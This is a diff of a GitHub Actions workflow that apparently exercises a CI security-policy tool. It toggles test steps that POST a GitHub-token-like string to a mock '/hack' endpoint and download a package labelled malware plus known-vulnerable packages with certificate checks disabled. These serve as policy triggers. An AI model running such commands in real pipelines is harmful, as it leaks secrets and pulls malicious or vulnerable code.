@@ -65,24 +65,24 @@ jobs:
       #   run: sleep 200 
 
       
-      - name: Dummy PUT request (Unauthorized PUT Action)
-        run: |
-          curl -X PUT "https://httpbin.org/put"
+  #    - name: Dummy PUT request (Unauthorized PUT Action)
+   #     run: |
+   #       curl -X PUT "https://httpbin.org/put"
 
    #   - name: 😈 Execute malicious script
   #      run: bash run_malicious_scripts.sh
 
-      - name: Secret Leak Policy
-        run: |
-          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
-            -H "Content-Type: application/json" \
-            -d '{
-            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-          }'
+     # - name: Secret Leak Policy
+    #    run: |
+    #      curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
+    #        -H "Content-Type: application/json" \
+          #   -d '{
+          #   "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          # }'
 
-          curl "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          # curl "https://api.veribom.com/graphql?GH=ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
 
-          curl "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+          # curl "https://api.veribom.com/graphql?GH=ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 
 
    #   - name: Mime Type Policy (Response Content Type)
@@ -92,22 +92,21 @@ jobs:
   #    - name: Content length download (Response Content Length)
   #      run: curl  -o 1GB.bin "https://nbg1-speed.hetzner.com/1GB.bin"
 
- #     - name: Install MALWARE package (in dataset) (Custom Builtins)
-#        continue-on-error: true
-#        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/abilityrequests-0.0.5-py2.py3-none-any.whl.metadata
+      - name: Install MALWARE package (in dataset) (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/abilityrequests-0.0.5-py2.py3-none-any.whl.metadata
         
     #  - name: Install MALWARE package (in dataset) (Custom Builtins)
    #     continue-on-error: true
   #      run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/lnatainstaller-1.0.0-py2.py3-none-any.whl.metadata
 
+      - name: Install KEV package (in dataset) (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl.metadata
 
- #     - name: Install KEV package (in dataset) (Custom Builtins)
-  #      continue-on-error: true
-  #      run: curl -k -O https://files.pythonhosted.org/packages/83/5c/0627be4c9976d56b1217cb5187b7504e7fd7d3503f8bfd312a04077bd4f7/salt-2015.8.0rc1-py2.py3-none-any.whl.metadata
-
-#      - name: Install Critical Vulnerable Package (in dataset) (Custom Builtins)
-#        continue-on-error: true
- #       run: curl -k -O https://files.pythonhosted.org/packages/33/62/30f6936941d87a5ed72efb24249437824f6b2c953901245b58c91fde2f27/cryptography-3.1.1-cp35-abi3-manylinux2010_x86_64.whl
+      - name: Install Critical Vulnerable Package (in dataset) (Custom Builtins)
+        continue-on-error: true
+        run: curl -k -O https://files.pythonhosted.org/packages/33/62/30f6936941d87a5ed72efb24249437824f6b2c953901245b58c91fde2f27/cryptography-3.1.1-cp35-abi3-manylinux2010_x86_64.whl
 
 #      - name: StabilityBufferPeriod Jan 13, 2026 (Python)
 #        continue-on-error: true
@@ -224,6 +223,7 @@ jobs:
             app_token: ${{ secrets.IR_API_KEY_POLICY_STAGE }}
             send_job_status: "true"
             debug: "true"
+
 
 
 
